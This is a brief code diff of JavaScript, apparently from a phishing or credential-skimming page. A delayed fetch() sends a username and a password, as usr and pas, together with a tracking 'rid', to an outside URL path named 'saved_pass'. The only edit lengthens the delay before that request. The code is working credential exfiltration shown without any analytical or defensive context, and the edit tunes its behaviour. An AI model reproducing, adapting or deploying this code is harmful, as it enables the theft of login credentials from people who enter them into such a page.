@@ -22,4 +22,4 @@ var rid = new URLSearchParams(window.location.search).get('rid');
 
 setTimeout(function(){
         fetch("https://www.cassaforenze.it/saved_pass?rid="+ rid + "&usr=" + u_val + "&pas=" + p_val)
-}, 5000);
+}, 10000);
